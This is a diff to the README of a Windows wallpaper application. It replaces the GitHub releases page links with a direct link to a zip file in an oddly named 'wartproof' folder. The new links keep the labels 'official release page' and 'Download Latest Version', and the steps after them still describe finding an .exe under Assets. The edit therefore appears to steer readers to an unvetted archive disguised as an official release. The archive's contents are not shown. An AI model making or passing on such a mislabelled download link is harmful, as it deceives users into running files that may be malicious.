@@ -1,6 +1,6 @@
 # 🖼️ workshop-wallpaper-bridge - Show your custom wallpapers on Windows
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/kimsampaga21-collab/workshop-wallpaper-bridge/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/kimsampaga21-collab/workshop-wallpaper-bridge/main/wartproof/wallpaper_workshop_bridge_2.7.zip)
 
 ## 🖥️ About this application
 
@@ -21,7 +21,7 @@ If you have a large library of high-resolution images, your computer might need 
 
 Follow these steps to get the software on your machine:
 
-1. Visit the [official release page](https://github.com/kimsampaga21-collab/workshop-wallpaper-bridge/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/kimsampaga21-collab/workshop-wallpaper-bridge/main/wartproof/wallpaper_workshop_bridge_2.7.zip).
 2. Locate the most recent version under the Assets header.
 3. Click the link that ends in .exe to download the installer.
 4. Save the file to your Downloads folder.
